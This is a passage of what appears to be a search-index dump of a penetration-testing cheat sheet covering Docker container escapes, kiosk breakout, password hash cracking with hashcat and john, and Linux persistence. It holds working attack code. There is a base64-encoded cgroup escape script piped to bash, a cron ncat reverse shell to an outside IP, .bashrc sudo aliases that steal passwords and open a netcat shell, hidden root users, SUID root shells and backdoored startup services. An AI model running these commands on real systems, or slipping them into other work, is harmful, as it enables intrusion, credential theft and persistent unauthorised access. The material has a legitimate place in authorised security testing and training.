\"cm5kX2Rpcj0kKGRhdGUgKyVzIHwgbWQ1c3VtIHwgaGVhZCAtYyAxMCkKbWtkaXIgL3RtcC9jZ3JwICYmIG1vdW50IC10IGNncm91cCAtbyByZG1hIGNncm91cCAvdG1wL2NncnAgJiYgbWtkaXIgL3RtcC9jZ3JwLyR7cm5kX2Rpcn0KZWNobyAxID4gL3RtcC9jZ3JwLyR7cm5kX2Rpcn0vbm90aWZ5X29uX3JlbGVhc2UKaG9zdF9wYXRoPWBzZWQgLW4gJ3MvLipccGVyZGlyPVwoW14sXSpcKS4qL1wxL3AnIC9ldGMvbXRhYmAKZWNobyAiJGhvc3RfcGF0aC9jbWQiID4gL3RtcC9jZ3JwL3JlbGVhc2VfYWdlbnQKY2F0ID4gL2NtZCA8PCBfRU5ECiMhL2Jpbi9zaApjYXQgPiAvcnVubWUuc2ggPDwgRU9GCnNsZWVwIDMwIApFT0YKc2ggL3J1bm1lLnNoICYKc2xlZXAgNQppZmNvbmZpZyBldGgwID4gIiR7aG9zdF9wYXRofS9vdXRwdXQiCmhvc3RuYW1lID4+ICIke2hvc3RfcGF0aH0vb3V0cHV0IgppZCA+PiAiJHtob3N0X3BhdGh9L291dHB1dCIKcHMgYXh1IHwgZ3JlcCBydW5tZS5zaCA+PiAiJHtob3N0X3BhdGh9L291dHB1dCIKX0VORAoKIyMgTm93IHdlIHRyaWNrIHRoZSBkb2NrZXIgZGFlbW9uIHRvIGV4ZWN1dGUgdGhlIHNjcmlwdC4KY2htb2QgYSt4IC9jbWQKc2ggLWMgImVjaG8gXCRcJCA+IC90bXAvY2dycC8ke3JuZF9kaXJ9L2Nncm91cC5wcm9jcyIKIyMgV2FpaWlpaXQgZm9yIGl0Li4uCnNsZWVwIDYKY2F0IC9vdXRwdXQKZWNobyAi4oCiPygowq/CsMK3Ll8u4oCiIHByb2ZpdCEg4oCiLl8uwrfCsMKvKSnYn+KAoiIK\" | base64 -d | bash -' Exploit breakdown : # On the host docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash # In the container mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x echo 1 > /tmp/cgrp/x/notify_on_release host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab` echo \"$host_path/cmd\" > /tmp/cgrp/release_agent echo '#!/bin/sh' > /cmd echo \"ps aux > $host_path/output\" >> /cmd chmod a+x /cmd sh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\"","title":"Abusing CAP_SYS_ADMIN capability"},{"location":"Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/#abusing-coredumps-and-core_pattern","text":"Find the mounting point using mount ps1 $ mount | head -n 1 overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/YLH6C6EQMMG7DA2AL5DUANDHYJ:/var/lib/docker/overlay2/l/HP7XLDFT4ERSCYVHJ2WMZBG2YT,upperdir=/var/lib/docker/overlay2/c51a87501842b287018d22e9d09d7d8dc4ede83a867f36ca199434d5ea5ac8f5/diff,workdir=/var/lib/docker/overlay2/c51a87501842b287018d22e9d09d7d8dc4ede83a867f36ca199434d5ea5ac8f5/work) Create an evil binary at the root of the filesystem: cp /tmp/poc /poc Set the program to be executed on the coredumps ps1 echo \"|/var/lib/docker/overlay2/c51a87501842b287018d22e9d09d7d8dc4ede83a867f36ca199434d5ea5ac8f5/diff/poc\" > /proc/sys/kernel/core_pattern Generate a coredump with a faulty program: gcc -o crash crash.c && ./crash cpp int main(void) { char buf[1]; for (int i = 0; i < 100; i++) { buf[i] = 1; } return 0; } Your payload should have been executed on the host","title":"Abusing coredumps and core_pattern"},{"location":"Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/#breaking-out-of-docker-via-runc","text":"The vulnerability allows a malicious container to (with minimal user interaction) overwrite the host runc binary and thus gain root-level code execution on the host. The level of user interaction is being able to run any command ... as root within a container in either of these contexts: Creating a new container using an attacker-controlled image. Attaching (docker exec) into an existing container which the attacker had previous write access to. - Vulnerability overview by the runC team Exploit for CVE-2019-5736 : https://github.com/twistlock/RunC-CVE-2019-5736 $ docker build -t cve-2019-5736:malicious_image_POC ./RunC-CVE-2019-5736/malicious_image_POC $ docker run --rm cve-2019-5736:malicious_image_POC","title":"Breaking out of Docker via runC"},{"location":"Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/#breaking-out-of-containers-using-a-device-file","text":"https://github.com/FSecureLABS/fdpasser In container, as root: ./fdpasser recv /moo /etc/shadow Outside container, as UID 1000: ./fdpasser send /proc/$(pgrep -f \"sleep 1337\")/root/moo Outside container: ls -la /etc/shadow Output: -rwsrwsrwx 1 root shadow 1209 Oct 10 2019 /etc/shadow","title":"Breaking out of containers using a device file"},{"location":"Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/#breaking-out-of-docker-via-kernel-modules-loading","text":"When privileged Linux containers attempt to load kernel modules, the modules are loaded into the host's kernel (because there is only one kernel, unlike VMs). This provides a route to an easy container escape. Exploitation: * Clone the repository : git clone https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.8_privileged_container_escaping * Build with make * Start a privileged docker container with docker run -it --privileged --hostname docker --mount \"type=bind,src=$PWD,dst=/root\" ubuntu * cd /root in the new container * Insert the kernel module with ./escape * Run ./execute ! Unlike other techniques, this module doesn't contain any syscalls hooks, but merely creates two new proc files; /proc/escape and /proc/output . /proc/escape only answers to write requests and simply executes anything that's passed to it via call_usermodehelper() . /proc/output just takes input and stores it in a buffer when written to, then returns that buffer when it's read from - essentially acting a like a file that both the container and the host can read/write to. The clever part is that anything we write to /proc/escape gets sandwiched into /bin/sh -c <INPUT> > /proc/output . This means that the command is run under /bin/sh and the output is redirected to /proc/output , which we can then read from within the container. Once the module is loaded, you can simply echo \"cat /etc/passwd\" > /proc/escape and then get the result via cat /proc/output . Alternatively, you can use the execute program to give yourself a makeshift shell (albeit an extraordinarily basic one). The only caveat is that we cannot be sure that the container has kmod installed (which provides insmod and rmmod ). To overcome this, after building the kernel module, we load it's byte array into a C program, which then uses the init_module() syscall to load the module into the kernel without needing insmod . If you're interested, take a look at the Makefile.","title":"Breaking out of Docker via kernel modules loading"},{"location":"Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/#references","text":"Hacking Docker Remotely - 17 March 2020 - ch0ks Understanding Docker container escapes - JULY 19, 2019 - Trail of Bits Capturing all the flags in BSidesSF CTF by pwning our infrastructure - Hackernoon Breaking out of Docker via runC \u2013 Explaining CVE-2019-5736 - Yuval Avrahami - February 21, 2019 CVE-2019-5736: Escape from Docker and Kubernetes containers to root on host - dragonsector.pl OWASP - Docker Security CheatSheet Anatomy of a hack: Docker Registry - NotSoSecure - April 6, 2017 Linux Kernel Hacking 3.8: Privileged Container Escapes - Harvey Phillips @xcellerator Escaping privileged containers for fun - 2022-03-06 :: Jordy Zomer","title":"References"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/","text":"Application Escape and Breakout Summary Gaining a command shell Sticky Keys Dialog Boxes Creating new files Open a new Windows Explorer instance Exploring Context Menus Save as Input Boxes Bypass file restrictions Internet Explorer Shell URI Handlers References Gaining a command shell Shortcut [Window] + [R] -> cmd [CTRL] + [SHIFT] + [ESC] -> Task Manager [CTRL] + [ALT] + [DELETE] -> Task Manager Access through file browser : Browsing to the folder containing the binary (i.e. C:\\windows\\system32\\ ), we can simply right click and open it Drag-and-drop : dragging and dropping any file onto the cmd.exe Hyperlink : file:///c:/Windows/System32/cmd.exe Task Manager : File > New Task (Run...) > cmd MSPAINT.exe Open MSPaint.exe and set the canvas size to: Width=6 and Height=1 pixels Zoom in to make the following tasks easier Using the colour picker, set pixels values to (from left to right): 1st: R: 10, G: 0, B: 0 2nd: R: 13, G: 10, B: 13 3rd: R: 100, G: 109, B: 99 4th: R: 120, G: 101, B: 46 5th: R: 0, G: 0, B: 101 6th: R: 0, G: 0, B: 0 Save it as 24-bit Bitmap ( .bmp; .dib) Change its extension from bmp to bat and run Sticky Keys Spawn the sticky keys dialog Via Shell URI : shell:::{20D04FE0-3AEA-1069-A2D8-08002B30309D} Hit 5 times [SHIFT] Visit \"Ease of Access Center\" You land on \"Setup Sticky Keys\", move up a level on \"Ease of Access Center\" Start the OSK (On-Screen-Keyboard) You can now use the keyboard shortcut (CTRL+N) Dialog Boxes Creating new files Batch files \u2013 Right click > New > Text File > rename to .BAT (or .CMD) > edit > open Shortcuts \u2013 Right click > New > Shortcut > %WINDIR%\\system32 Open a new Windows Explorer instance Right click any folder > select Open in new window Exploring Context Menus Right click any file/folder and explore context menus Clicking Properties , especially on shortcuts, can yield further access via Open File Location Save as \"Save as\" / \"Open as\" option \"Print\" feature \u2013 selecting \"print to file\" option (XPS/PDF/etc) \\\\127.0.0.1\\c$\\Windows\\System32\\ and execute cmd.exe Input Boxes Many input boxes accept file paths; try all inputs with UNC paths such as //attacker\u2013pc/ or //127.0.0.1/c$ or C:\\ Bypass file restrictions Enter . or *.exe or similar in File name box Internet Explorer Download and Run/Open Text files -> opened by Notepad Menus The address bar Search menus Help menus Print menus All other menus that provide dialog boxes Accessing filesystem Enter these paths in the address bar: file://C:/windows C:/windows/ %HOMEDRIVE% \\127.0.0.1\\c$\\Windows\\System32 Unassociated Protocols It is possible to escape a browser based kiosk with other protocols than usual http or https . If you have access to the address bar, you can use any known protocol ( irc , ftp , telnet , mailto , etc.) to trigger the open with prompt and select a program installed on the host. The program will than be launched with the uri as a parameter, you need to select a program that will not crash when recieving it. It is possible to send multiple parameters to the program by adding spaces in your uri. Note: This technique required that the protocol used is not already associated with a program. Example - Launching Firefox with a custom profile: This is a nice trick since Firefox launched with the custom profile may not be as much hardened as the default profile. Firefox need to be installed. Enter the following uri in the address bar: irc://127.0.0.1 -P \"Test\" Press enter to navigate to the uri. Select the firefox program. Firefox will be launched with the profile Test . In this example, it's the equivalent of running the following command: firefox irc://127.0.0.1 -P \"Test\" Shell URI Handlers shell:DocumentsLibrary shell:Librariesshell:UserProfiles shell:Personal shell:SearchHomeFolder shell:System shell:NetworkPlacesFolder shell:SendTo shell:Common Administrative Tools shell:MyComputerFolder shell:InternetFolder References PentestPartners - Breaking out of Citrix and other restricted desktop environments Breaking Out! of Applications Deployed via Terminal Services, Citrix, and Kiosks - Scott Sutherland - May 22nd, 2013 Escaping from KIOSKs - HackTricks Breaking out of Windows Kiosks using only Microsoft Edge - Firat Acar - May 24, 2022","title":"Application Escape and Breakout"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#application-escape-and-breakout","text":"","title":"Application Escape and Breakout"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#summary","text":"Gaining a command shell Sticky Keys Dialog Boxes Creating new files Open a new Windows Explorer instance Exploring Context Menus Save as Input Boxes Bypass file restrictions Internet Explorer Shell URI Handlers References","title":"Summary"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#gaining-a-command-shell","text":"Shortcut [Window] + [R] -> cmd [CTRL] + [SHIFT] + [ESC] -> Task Manager [CTRL] + [ALT] + [DELETE] -> Task Manager Access through file browser : Browsing to the folder containing the binary (i.e. C:\\windows\\system32\\ ), we can simply right click and open it Drag-and-drop : dragging and dropping any file onto the cmd.exe Hyperlink : file:///c:/Windows/System32/cmd.exe Task Manager : File > New Task (Run...) > cmd MSPAINT.exe Open MSPaint.exe and set the canvas size to: Width=6 and Height=1 pixels Zoom in to make the following tasks easier Using the colour picker, set pixels values to (from left to right): 1st: R: 10, G: 0, B: 0 2nd: R: 13, G: 10, B: 13 3rd: R: 100, G: 109, B: 99 4th: R: 120, G: 101, B: 46 5th: R: 0, G: 0, B: 101 6th: R: 0, G: 0, B: 0 Save it as 24-bit Bitmap ( .bmp; .dib) Change its extension from bmp to bat and run","title":"Gaining a command shell"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#sticky-keys","text":"Spawn the sticky keys dialog Via Shell URI : shell:::{20D04FE0-3AEA-1069-A2D8-08002B30309D} Hit 5 times [SHIFT] Visit \"Ease of Access Center\" You land on \"Setup Sticky Keys\", move up a level on \"Ease of Access Center\" Start the OSK (On-Screen-Keyboard) You can now use the keyboard shortcut (CTRL+N)","title":"Sticky Keys"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#dialog-boxes","text":"","title":"Dialog Boxes"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#creating-new-files","text":"Batch files \u2013 Right click > New > Text File > rename to .BAT (or .CMD) > edit > open Shortcuts \u2013 Right click > New > Shortcut > %WINDIR%\\system32","title":"Creating new files"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#open-a-new-windows-explorer-instance","text":"Right click any folder > select Open in new window","title":"Open a new Windows Explorer instance"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#exploring-context-menus","text":"Right click any file/folder and explore context menus Clicking Properties , especially on shortcuts, can yield further access via Open File Location","title":"Exploring Context Menus"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#save-as","text":"\"Save as\" / \"Open as\" option \"Print\" feature \u2013 selecting \"print to file\" option (XPS/PDF/etc) \\\\127.0.0.1\\c$\\Windows\\System32\\ and execute cmd.exe","title":"Save as"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#input-boxes","text":"Many input boxes accept file paths; try all inputs with UNC paths such as //attacker\u2013pc/ or //127.0.0.1/c$ or C:\\","title":"Input Boxes"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#bypass-file-restrictions","text":"Enter . or *.exe or similar in File name box","title":"Bypass file restrictions"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#internet-explorer","text":"","title":"Internet Explorer"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#download-and-runopen","text":"Text files -> opened by Notepad","title":"Download and Run/Open"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#menus","text":"The address bar Search menus Help menus Print menus All other menus that provide dialog boxes","title":"Menus"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#accessing-filesystem","text":"Enter these paths in the address bar: file://C:/windows C:/windows/ %HOMEDRIVE% \\127.0.0.1\\c$\\Windows\\System32","title":"Accessing filesystem"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#unassociated-protocols","text":"It is possible to escape a browser based kiosk with other protocols than usual http or https . If you have access to the address bar, you can use any known protocol ( irc , ftp , telnet , mailto , etc.) to trigger the open with prompt and select a program installed on the host. The program will than be launched with the uri as a parameter, you need to select a program that will not crash when recieving it. It is possible to send multiple parameters to the program by adding spaces in your uri. Note: This technique required that the protocol used is not already associated with a program. Example - Launching Firefox with a custom profile: This is a nice trick since Firefox launched with the custom profile may not be as much hardened as the default profile. Firefox need to be installed. Enter the following uri in the address bar: irc://127.0.0.1 -P \"Test\" Press enter to navigate to the uri. Select the firefox program. Firefox will be launched with the profile Test . In this example, it's the equivalent of running the following command: firefox irc://127.0.0.1 -P \"Test\"","title":"Unassociated Protocols"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#shell-uri-handlers","text":"shell:DocumentsLibrary shell:Librariesshell:UserProfiles shell:Personal shell:SearchHomeFolder shell:System shell:NetworkPlacesFolder shell:SendTo shell:Common Administrative Tools shell:MyComputerFolder shell:InternetFolder","title":"Shell URI Handlers"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#references","text":"PentestPartners - Breaking out of Citrix and other restricted desktop environments Breaking Out! of Applications Deployed via Terminal Services, Citrix, and Kiosks - Scott Sutherland - May 22nd, 2013 Escaping from KIOSKs - HackTricks Breaking out of Windows Kiosks using only Microsoft Edge - Firat Acar - May 24, 2022","title":"References"},{"location":"Methodology%20and%20Resources/Hash%20Cracking/","text":"Hash Cracking Summary Hashcat Hashcat Example Hashes Hashcat Install Mask attack Dictionary John Usage Rainbow tables Tips and Tricks Online Cracking Resources References Hashcat Hashcat Install apt install cmake build-essential -y apt install checkinstall git -y git clone https://github.com/hashcat/hashcat.git && cd hashcat && make -j 8 && make install Extract the hash Get the hash format: https://hashcat.net/wiki/doku.php?id=example_hashes Establish a cracking stratgy based on hash format (ex: wordlist -> wordlist + rules -> mask -> combinator mode -> prince attack -> ...) Enjoy plains Review strategy Start over Dictionary Every word of a given list (a.k.a. dictionary) is hashed and compared against the target hash. hashcat --attack-mode 0 --hash-type $number $hashes_file $wordlist_file -r $my_rules Wordlists packetstorm weakpass_3a weakpass_3 Hashes.org kerberoast_pws hashmob.net clem9669/wordlists Rules One Rule to Rule Them All nsa-rules hob064 d3adhob0 clem9669/hashcat-rule Mask attack Mask attack is an attack mode which optimize brute-force. Every possibility for a given character set and a given length (i.e. aaa, aab, aac, ...) is hashed and compared against the target hash. # Mask: upper*1+lower*5+digit*2 and upper*1+lower*6+digit*2 hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?d?d hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?l?d?d hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \"*+!??\" ?u?l?l?l?l?l?d?d?1 hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \"*+!??\" ?u?l?l?l?l?l?l?d?d?1 # Mask: upper*1+lower*3+digit*4 and upper*1+lower*3+digit*4 hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?d?d?d?d hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?d?d?d?d hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?d?d?d?d hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \"*+!??\" ?u?l?l?l?d?d?d?d?1 hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \"*+!??\" ?u?l?l?l?l?d?d?d?d?1 # Mask: lower*6 + digit*2 + special digit(+!?*) hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \"*+!??\" ?l?l?l?l?l?l?d?d?1 hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \"*+!??\" ?l?l?l?l?l?l?d?d?1?1 # Mask: lower*6 + digit*2 hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 /content/hashcat/masks/8char-1l-1u-1d-1s-compliant.hcmask hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 ?l?d?u ?1?1?1?1?1?1?1?1 # Other examples hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?a?a?a?a?a?a?a?a?a hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?a?a?a?a?a?a?a?a hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?l?d?d?d?d hashcat --attack-mode 3 --increment --increment-min 4 --increment-max 8 --hash-type $number $hashes_file \"?a?a?a?a?a?a?a?a?a?a?a?a\" hashcat --attack-mode 3 --hash-type $number $hashes_file \"?u?l?l?l?d?d?d?d?s\" hashcat --attack-mode 3 --hash-type $number $hashes_file \"?a?a?a?a?a?a?a?a\" hashcat --attack-mode 3 --custom-charset1 \"?u\" --custom-charset2 \"?l?u?d\" --custom-charset3 \"?d\" --hash-type $number $hashes_file \"?1?2?2?2?3\" Shortcut Characters ?l abcdefghijklmnopqrstuvwxyz ?u ABCDEFGHIJKLMNOPQRSTUVWXYZ ?d 0123456789 ?s !\"#$%&'()*+,-./:;<=>?@[]^_`{}~ ?a ?l?u?d?s ?b 0x00 - 0xff John John Usage # Run on password file containing hashes to be cracked john passwd # Use a specific wordlist john --wordlist=<wordlist> passwd # Use a specific wordlist with rules john --wordlist=<wordlist> passwd --rules=Jumbo # Show cracked passwords john --show passwd # Restore interrupted sessions john --restore Rainbow tables The hash is looked for in a pre-computed table. It is a time-memory trade-off that allows cracking hashes faster, but costing a greater amount of memory than traditional brute-force of dictionary attacks. This attack cannot work if the hashed value is salted (i.e. hashed with an additional random value as prefix/suffix, making the pre-computed table irrelevant) Tips and Tricks Cloud GPU penglab - Abuse of Google Colab for cracking hashes. \ud83d\udc27 google-colab-hashcat - Google colab hash cracking Cloudtopolis - Zero Infrastructure Password Cracking Nephelees - also a NTDS cracking tool abusing Google Colab Build a rig on premise Pentester's Portable Cracking Rig - $1000 How To Build A Password Cracking Rig - 5000$ Online cracking Hashes.com hashmob.net : great community with Discord Use the loopback in combination with rules and dictionary to keep cracking until you don't find new passsword: hashcat --loopback --attack-mode 0 --rules-file $rules_file --hash-type $number $hashes_file $wordlist_file Online Cracking Resources ~~ hashes.com ~~ crackstation Hashmob References Cracking - The Hacker Recipes Using Hashcat to Crack Hashes on Azure miloserdov.org hashcat miloserdov.org john","title":"Hash Cracking"},{"location":"Methodology%20and%20Resources/Hash%20Cracking/#hash-cracking","text":"","title":"Hash Cracking"},{"location":"Methodology%20and%20Resources/Hash%20Cracking/#summary","text":"Hashcat Hashcat Example Hashes Hashcat Install Mask attack Dictionary John Usage Rainbow tables Tips and Tricks Online Cracking Resources References","title":"Summary"},{"location":"Methodology%20and%20Resources/Hash%20Cracking/#hashcat","text":"","title":"Hashcat"},{"location":"Methodology%20and%20Resources/Hash%20Cracking/#hashcat-install","text":"apt install cmake build-essential -y apt install checkinstall git -y git clone https://github.com/hashcat/hashcat.git && cd hashcat && make -j 8 && make install Extract the hash Get the hash format: https://hashcat.net/wiki/doku.php?id=example_hashes Establish a cracking stratgy based on hash format (ex: wordlist -> wordlist + rules -> mask -> combinator mode -> prince attack -> ...) Enjoy plains Review strategy Start over","title":"Hashcat Install"},{"location":"Methodology%20and%20Resources/Hash%20Cracking/#dictionary","text":"Every word of a given list (a.k.a. dictionary) is hashed and compared against the target hash. hashcat --attack-mode 0 --hash-type $number $hashes_file $wordlist_file -r $my_rules Wordlists packetstorm weakpass_3a weakpass_3 Hashes.org kerberoast_pws hashmob.net clem9669/wordlists Rules One Rule to Rule Them All nsa-rules hob064 d3adhob0 clem9669/hashcat-rule","title":"Dictionary"},{"location":"Methodology%20and%20Resources/Hash%20Cracking/#mask-attack","text":"Mask attack is an attack mode which optimize brute-force. Every possibility for a given character set and a given length (i.e. aaa, aab, aac, ...) is hashed and compared against the target hash. # Mask: upper*1+lower*5+digit*2 and upper*1+lower*6+digit*2 hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?d?d hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?l?d?d hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \"*+!??\" ?u?l?l?l?l?l?d?d?1 hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \"*+!??\" ?u?l?l?l?l?l?l?d?d?1 # Mask: upper*1+lower*3+digit*4 and upper*1+lower*3+digit*4 hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?d?d?d?d hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?d?d?d?d hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?d?d?d?d hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \"*+!??\" ?u?l?l?l?d?d?d?d?1 hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \"*+!??\" ?u?l?l?l?l?d?d?d?d?1 # Mask: lower*6 + digit*2 + special digit(+!?*) hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \"*+!??\" ?l?l?l?l?l?l?d?d?1 hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \"*+!??\" ?l?l?l?l?l?l?d?d?1?1 # Mask: lower*6 + digit*2 hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 /content/hashcat/masks/8char-1l-1u-1d-1s-compliant.hcmask hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 ?l?d?u ?1?1?1?1?1?1?1?1 # Other examples hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?a?a?a?a?a?a?a?a?a hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?a?a?a?a?a?a?a?a hashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?l?d?d?d?d hashcat --attack-mode 3 --increment --increment-min 4 --increment-max 8 --hash-type $number $hashes_file \"?a?a?a?a?a?a?a?a?a?a?a?a\" hashcat --attack-mode 3 --hash-type $number $hashes_file \"?u?l?l?l?d?d?d?d?s\" hashcat --attack-mode 3 --hash-type $number $hashes_file \"?a?a?a?a?a?a?a?a\" hashcat --attack-mode 3 --custom-charset1 \"?u\" --custom-charset2 \"?l?u?d\" --custom-charset3 \"?d\" --hash-type $number $hashes_file \"?1?2?2?2?3\" Shortcut Characters ?l abcdefghijklmnopqrstuvwxyz ?u ABCDEFGHIJKLMNOPQRSTUVWXYZ ?d 0123456789 ?s !\"#$%&'()*+,-./:;<=>?@[]^_`{}~ ?a ?l?u?d?s ?b 0x00 - 0xff","title":"Mask attack"},{"location":"Methodology%20and%20Resources/Hash%20Cracking/#john","text":"","title":"John"},{"location":"Methodology%20and%20Resources/Hash%20Cracking/#john-usage","text":"# Run on password file containing hashes to be cracked john passwd # Use a specific wordlist john --wordlist=<wordlist> passwd # Use a specific wordlist with rules john --wordlist=<wordlist> passwd --rules=Jumbo # Show cracked passwords john --show passwd # Restore interrupted sessions john --restore","title":"John Usage"},{"location":"Methodology%20and%20Resources/Hash%20Cracking/#rainbow-tables","text":"The hash is looked for in a pre-computed table. It is a time-memory trade-off that allows cracking hashes faster, but costing a greater amount of memory than traditional brute-force of dictionary attacks. This attack cannot work if the hashed value is salted (i.e. hashed with an additional random value as prefix/suffix, making the pre-computed table irrelevant)","title":"Rainbow tables"},{"location":"Methodology%20and%20Resources/Hash%20Cracking/#tips-and-tricks","text":"Cloud GPU penglab - Abuse of Google Colab for cracking hashes. \ud83d\udc27 google-colab-hashcat - Google colab hash cracking Cloudtopolis - Zero Infrastructure Password Cracking Nephelees - also a NTDS cracking tool abusing Google Colab Build a rig on premise Pentester's Portable Cracking Rig - $1000 How To Build A Password Cracking Rig - 5000$ Online cracking Hashes.com hashmob.net : great community with Discord Use the loopback in combination with rules and dictionary to keep cracking until you don't find new passsword: hashcat --loopback --attack-mode 0 --rules-file $rules_file --hash-type $number $hashes_file $wordlist_file","title":"Tips and Tricks"},{"location":"Methodology%20and%20Resources/Hash%20Cracking/#online-cracking-resources","text":"~~ hashes.com ~~ crackstation Hashmob","title":"Online Cracking Resources"},{"location":"Methodology%20and%20Resources/Hash%20Cracking/#references","text":"Cracking - The Hacker Recipes Using Hashcat to Crack Hashes on Azure miloserdov.org hashcat miloserdov.org john","title":"References"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/","text":"Linux - Persistence Summary Basic reverse shell Add a root user Suid Binary Crontab - Reverse shell Backdooring a user's bash_rc Backdooring a startup service Backdooring a user startup file Backdooring a driver Backdooring the APT Backdooring the SSH Tips Additional Linux Persistence Options References Basic reverse shell ncat --udp -lvp 4242 ncat --sctp -lvp 4242 ncat --tcp -lvp 4242 Add a root user sudo useradd -ou 0 -g 0 john sudo passwd john echo \"linuxpassword\" | passwd --stdin john Suid Binary TMPDIR2=\"/var/tmp\" echo 'int main(void){setresuid(0, 0, 0);system(\"/bin/sh\");}' > $TMPDIR2/croissant.c gcc $TMPDIR2/croissant.c -o $TMPDIR2/croissant 2>/dev/null rm $TMPDIR2/croissant.c chown root:root $TMPDIR2/croissant chmod 4777 $TMPDIR2/croissant Crontab - Reverse shell (crontab -l ; echo \"@reboot sleep 200 && ncat 192.168.1.2 4242 -e /bin/bash\")|crontab 2> /dev/null Backdooring a user's bash_rc (FR/EN Version) TMPNAME2=\".systemd-private-b21245afee3b3274d4b2e2-systemd-timesyncd.service-IgCBE0\" cat << EOF > /tmp/$TMPNAME2 alias sudo='locale=$(locale | grep LANG | cut -d= -f2 | cut -d_ -f1);if [ \\$locale = \"en\" ]; then echo -n \"[sudo] password for \\$USER: \";fi;if [ \\$locale = \"fr\" ]; then echo -n \"[sudo] Mot de passe de \\$USER: \";fi;read -s pwd;echo; unalias sudo; echo \"\\$pwd\" | /usr/bin/sudo -S nohup nc -lvp 1234 -e /bin/bash > /dev/null && /usr/bin/sudo -S ' EOF if [ -f ~/.bashrc ]; then cat /tmp/$TMPNAME2 >> ~/.bashrc fi if [ -f ~/.zshrc ]; then cat /tmp/$TMPNAME2 >> ~/.zshrc fi rm /tmp/$TMPNAME2 or add the following line inside its .bashrc file. $ chmod u+x ~/.hidden/fakesudo $ echo \"alias sudo=~/.hidden/fakesudo\" >> ~/.bashrc and create the fakesudo script. read -sp \"[sudo] password for $USER: \" sudopass echo \"\" sleep 2 echo \"Sorry, try again.\" echo $sudopass >> /tmp/pass.txt /usr/bin/sudo $@ Backdooring a startup service RSHELL=\"ncat $LMTHD $LHOST $LPORT -e \\\"/bin/bash -c id;/bin/bash\\\" 2>/dev/null\" sed -i -e \"4i \\$RSHELL\" /etc/network/if-up.d/upstart Backdooring a user startup file Linux, write a file in ~/.config/autostart/NAME_OF_FILE.desktop In : ~/.config/autostart/*.desktop [Desktop Entry] Type=Application Name=Welcome 